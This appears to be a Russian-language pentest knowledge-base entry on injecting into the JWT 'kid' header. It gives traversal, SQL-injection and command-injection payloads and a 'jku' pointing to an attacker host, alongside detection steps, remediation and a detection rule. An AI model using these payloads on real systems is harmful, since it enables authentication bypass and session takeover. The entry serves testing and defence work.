---
id: auth-bypass-jwt-kid-injection
title: "JWT: инъекция в kid (путь к ключу / SQLi / null)"
type: auth-bypass
target: jwt
category: web
difficulty: advanced
bypass: filter
tags: [jwt, kid, path-traversal, sqli]
tested_on: ["самописные JWT-валидаторы", "node-jsonwebtoken legacy", "Ruby JWT"]
success_rate: 0.3
risk: critical
cwe: "CWE-347"
lab: null
tester: manual
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/all-topics"
graph:
  - target: "jwt"
    type: related_to
  - target: "auth-bypass"
    type: instance_of
  - target: "lfi-rfi"
    type: related_to
  - target: "sqli"
    type: related_to
  - target: "session-hijacking"
    type: leads_to
---

# JWT: инъекция в kid (путь к ключу / SQLi / null)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
```

## Explanation

Заголовок `kid` указывает, каким ключом проверять подпись. Если значение `kid`
подставляется в путь к файлу, SQL-запрос или команду без валидации, ключ становится
управляемым:

1. **Path traversal** -> `kid=../../../../dev/null`: файл пуст, ключ = пустая строка,
    подпись пересчитывается с `secret = ""` и принимается.
    Варианты: `kid=/proc/self/environ` (если там предсказуемое значение),
    `kid=../../../../tmp/attacker.key` (файл, который вы создали через загрузку).
2. **SQL-инъекция** -> `kid=' UNION SELECT 'known-secret' --`: запрос к таблице
    ключей возвращает известное атакующему значение.
3. **Командная инъекция** -> `kid=;cat /tmp/key;` в обвязках, вызывающих shell.
4. **Непредусмотренный тип** -> `kid` отсутствует/массив/объект: часть библиотек
    падает в ветку «ключ по умолчанию» или возвращает `None` как секрет.

Родственные векторы: `jku`/`jwk`/`x5u`/`x5c` — URL или сам ключ прямо в заголовке
(если валидатор доверяет им, подпись проверяется ключом атакующего).

## Detection

1. Декодируйте JWT: есть ли `kid`, `jku`, `jwk`, `x5u`, `x5c`?
2. Попробуйте `kid=../../dev/null` и `kid` с SQLi-синтаксисом — изменилась ли ошибка
   (`invalid signature` против `key not found`).
3. Подставьте свой `jku` на контролируемый JWKS-эндпоинт.
4. Инструменты: `jwt_tool` (-X k, -X i), `jwteph`, Burp JWT-расширение.
5. В коде ищите конкатенацию `kid` в `open()`, SQL или shell-вызов.

## Remediation

- `kid` — **whitelist** известных идентификаторов (map id -> ключ), никаких
  путей и запросов.
- Игнорировать/отклонять `jku`, `jwk`, `x5u`, `x5c`, `jwa` из заголовка токена;
  JWKS брать только из конфигурации.
- Жёстко задавать ожидаемый алгоритм на сервере (allowlist), отклонять `none`
  и смену семейства алгоритмов (RS256 -> HS256).
- Использовать зрелые библиотеки с включённой валидацией (и обновлять их).
- Проверять `iss`, `aud`, `exp`, `nbf`; короткие TTL + ротация.
- Логировать отказы проверки подписи и неожиданные `kid`.

## Variants

```
{"alg":"HS256","kid":"' UNION SELECT 'secret' -- "}
```

```
{"alg":"HS256","jku":"https://attacker.tld/jwks.json"}
```

```
{"alg":"HS256","kid":"key_"}  //kid отсутствует
```

## Detection rules

```yaml
title: JWT kid-инъекция — traversal/SQL/команды в идентификаторе ключа
id: e5f6a7b8-0088-4e5f-9a7b-000000000088
status: experimental
description: >-
  Заголовок kid участвует в выборе ключа (файл, БД, команда) — инъекция в
  него даёт подпись известным значением (/dev/null, старый ключ) или RCE.
  Признаки: ../, абсолютные пути, SQL/командные маркеры в jwt_kid.
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://portswigger.net/web-security/jwt
logsource:
  category: application
  definition: 'логи верификации JWT с полем jwt_kid'
detection:
  selection:
    event_action: jwt_verify
    jwt_kid|contains:
      - '../'
      - '..\'
      - '/dev/null'
      - '/etc/passwd'
      - 'union select'
      - "' OR "
      - '; '
      - '|'
      - 'sleep('
  condition: selection
fields:
  - source_ip
  - jwt_alg
  - jwt_kid
  - failure_reason
falsepositives:
  - kid в формате пути к ключу внутри хранилища (/keys/2026-10.pem) — сверяйте
    с реестром своих kid; traversal и спецсимволы в легитимных kid не встречаются
level: critical
tags:
  - attack.credential_access
  - attack.t1190
  - cwe.347
```
